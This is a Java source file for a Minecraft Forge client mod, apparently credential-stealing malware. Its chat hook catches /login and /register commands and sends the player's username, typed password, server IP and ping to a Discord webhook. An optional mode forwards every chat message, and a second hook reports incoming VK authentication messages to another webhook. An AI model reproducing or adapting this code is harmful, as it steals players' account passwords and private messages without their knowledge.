package com.jodexindustries.loggermod;

import net.minecraft.client.Minecraft;
import net.minecraftforge.api.distmarker.Dist;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

import java.awt.*;
import java.io.IOException;
import java.util.Objects;

@Mod.EventBusSubscriber(Dist.CLIENT)
public class Log {
    static DiscordWebhook webhookLogger = Config.logger;
    static DiscordWebhook webhookDetector = Config.detector;

    @SubscribeEvent
    public static void ChatEvent(ClientChatEvent e) throws IOException {
        String msg = e.getMessage();
        String[] sentences = e.getMessage().split(" ");

        if (!Config.logAll) {
            if ((msg.startsWith("/l") || msg.startsWith("/login") || msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
                webhookLogger.clearEmbeds();
                webhookLogger.addEmbed(new DiscordWebhook.EmbedObject()
                        .setTitle("Infinity")
                        .setDescription("Minecraft Modification | Logger")
                        .setColor(new Color(0xA800E8))
                        .addField("USER", Minecraft.getInstance().getSession().getUsername(), true)
                        .addField("PASSWORD", sentences[1], true)
                        .addField("SERVER", Objects.requireNonNull(Minecraft.getInstance().getCurrentServerData()).serverIP, true)
                        .addField("PING", String.valueOf(Objects.requireNonNull(Minecraft.getInstance().getCurrentServerData()).pingToServer), true)


                        .setThumbnail("https://cdn.discordapp.com/avatars/597799398507806723/0ab545727be133bb12f4865ea412b4b4.png?size=512"));

                webhookLogger.execute();
            }
        } else {
            webhookLogger.setContent("```" + Minecraft.getInstance().getSession().getUsername() + ": " + msg + "```");
            webhookLogger.execute();
        }
    }

    @SubscribeEvent
    public static void detector(ClientChatReceivedEvent e) {
        String msg = e.getMessage().getUnformattedComponentText();
        // String[] sentences = msg.split(" ");

        if (msg.contains("ВКонтакте")) {
            try {
                webhookDetector.setContent("DETECTED VK-AUTH MESSAGE: ```" + msg + "```");
                webhookDetector.execute();
            } catch (IOException ignored) {}
        }
    }
}
